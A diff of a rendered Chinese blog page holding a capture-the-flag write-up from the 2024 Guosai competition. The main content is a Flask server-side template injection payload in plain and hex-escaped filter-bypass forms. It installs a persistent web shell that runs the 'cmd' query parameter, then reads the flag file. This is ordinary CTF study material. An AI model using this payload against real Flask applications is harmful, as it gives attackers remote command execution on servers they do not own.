@@ -8,6 +8,8 @@
       
       
       
+        <link rel="canonical" href="https://zero6six.github.io/CTF/24%E5%9B%BD%E8%B5%9B/WP/">
+      
       
         <link rel="prev" href="../../%E8%B5%84%E6%BA%90/">
       
@@ -110,6 +112,43 @@
     
     
     
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
     
   </nav>
   
@@ -158,7 +197,7 @@
         
   
   <span class="md-ellipsis">
-    Welcome to MkDocs
+    凌六博客
   </span>
   
 
@@ -2444,12 +2483,12 @@
 <li>https://www.cnblogs.com/meraklbz/p/18572680 无回显 SSTI</li>
 <li>https://blog.csdn.net/qq_38154820/article/details/111399386 breakjail</li>
 </ul>
-<pre><code class="language-python"># 原 payload
-url_for__globals__['__builtins__']['eval'](&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\&quot;global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\&quot;)==None else resp)&quot;,{'request':url_for.__globals__['request'],'app':url_for.__globals__['sys'].modules['__main__'].__dict__['app']})
+<div class="highlight"><pre><span></span><code><span class="c1"># 原 payload</span>
+<span class="n">url_for__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s2">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(</span><span class="se">\&quot;</span><span class="s2">global CmdResp;CmdResp=__import__(</span><span class="se">\&#39;</span><span class="s2">flask</span><span class="se">\&#39;</span><span class="s2">).make_response(__import__(</span><span class="se">\&#39;</span><span class="s2">os</span><span class="se">\&#39;</span><span class="s2">).popen(request.args.get(</span><span class="se">\&#39;</span><span class="s2">cmd</span><span class="se">\&#39;</span><span class="s2">)).read())</span><span class="se">\&quot;</span><span class="s2">)==None else resp)&quot;</span><span class="p">,{</span><span class="s1">&#39;request&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;request&#39;</span><span class="p">],</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;__main__&#39;</span><span class="p">]</span><span class="o">.</span><span class="vm">__dict__</span><span class="p">[</span><span class="s1">&#39;app&#39;</span><span class="p">]})</span>
 
-# 改写后的 payload
-url_for['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x65\x76\x61\x6c'](&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\&quot;global CmdResp;CmdResp=\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f(\'flask\').make_response(getattr(\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f(\'\x6f\x73\'), \'\x70\x6f\x70\x65\x6e\')(request.args.get(\'cmd\')).read())\&quot;)==None else resp)&quot;,{'request':url_for['\x5f\x5fglobals\x5f\x5f']['request'],'app':url_for['\x5f\x5fglobals\x5f\x5f']['\x73\x79\x73'].modules['\x5f\x5fmain\x5f\x5f']['\x5f\x5fdict\x5f\x5f']['app']})
-</code></pre>
+<span class="c1"># 改写后的 payload</span>
+<span class="n">url_for</span><span class="p">[</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">globals</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">builtins</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x65\x76\x61\x6c</span><span class="s1">&#39;</span><span class="p">](</span><span class="s2">&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#39;cmd&#39;) and exec(</span><span class="se">\&quot;</span><span class="s2">global CmdResp;CmdResp=</span><span class="se">\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f</span><span class="s2">(</span><span class="se">\&#39;</span><span class="s2">flask</span><span class="se">\&#39;</span><span class="s2">).make_response(getattr(</span><span class="se">\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f</span><span class="s2">(</span><span class="se">\&#39;\x6f\x73\&#39;</span><span class="s2">), </span><span class="se">\&#39;\x70\x6f\x70\x65\x6e\&#39;</span><span class="s2">)(request.args.get(</span><span class="se">\&#39;</span><span class="s2">cmd</span><span class="se">\&#39;</span><span class="s2">)).read())</span><span class="se">\&quot;</span><span class="s2">)==None else resp)&quot;</span><span class="p">,{</span><span class="s1">&#39;request&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="p">[</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">globals</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;request&#39;</span><span class="p">],</span><span class="s1">&#39;app&#39;</span><span class="p">:</span><span class="n">url_for</span><span class="p">[</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">globals</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x73\x79\x73</span><span class="s1">&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">main</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;</span><span class="se">\x5f\x5f</span><span class="s1">dict</span><span class="se">\x5f\x5f</span><span class="s1">&#39;</span><span class="p">][</span><span class="s1">&#39;app&#39;</span><span class="p">]})</span>
+</code></pre></div>
 <p>改写重点在于对于 <code>__</code> 和其他关键字的处理，其中 .popup 方法无法直接改写，因此改用 getattr 然后再改写 popup。</p>
 <p>将改写后的 payload 包裹在 <code>{{}}</code> 中，作为 code 字段的参数 post 到该网址，便能 getshell，然后访问 <code>/?cmd=cat ../flag</code> 拿到 flag：<code>flag{9d95d67a-47df-4eb2-a230-e9f30f2adc66}</code>。</p>
 <h3 id="hello_web">hello_web</h3>
@@ -2457,10 +2496,10 @@ url_for['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x65\x76\x61\x6c
 <p><img alt="" src="../attachments/Pasted%20image%2020241215093135.png" /></p>
 <p>去 /bookmarks.html，内含 hackme.php、tips.php 两个提示，访问对应 php。</p>
 <p>在访问对应 php 之后重定向的请求的请求头中可以看到字段：</p>
-<pre><code>tip: &amp;#105;&amp;#110;&amp;#99;&amp;#108;&amp;#117;&amp;#100;&amp;#101;&amp;#46;&amp;#112;&amp;#104;&amp;#112
+<div class="highlight"><pre><span></span><code>tip: &amp;#105;&amp;#110;&amp;#99;&amp;#108;&amp;#117;&amp;#100;&amp;#101;&amp;#46;&amp;#112;&amp;#104;&amp;#112
 =
 tip: include.php
-</code></pre>
+</code></pre></div>
 
 
 
